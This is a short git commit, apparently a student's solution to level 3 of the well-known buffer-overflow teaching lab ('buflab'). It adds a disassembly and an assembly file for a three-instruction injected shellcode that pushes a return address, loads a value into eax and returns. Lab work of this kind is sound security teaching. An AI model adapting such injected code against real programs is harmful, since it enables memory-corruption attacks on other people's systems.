4a3a558721a7eff55ed2ff7655f2df3d84452cca
ZhangZhenghao <zhangzhenghao@hotmail.com>
2015-08-01 14:49:56 +0800

    Finifished level 3

---
+++ buflab/level3.d
@@ -0,0 +1,10 @@
+
+level3.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	68 be 8d 04 08       	push   $0x8048dbe
+   5:	a1 08 d1 04 08       	mov    0x804d108,%eax
+   a:	c3                   	ret    
---
+++ buflab/level3.s
@@ -0,0 +1,3 @@
+pushl	$0x08048dbe
+movl	0x804d108,%eax
+ret
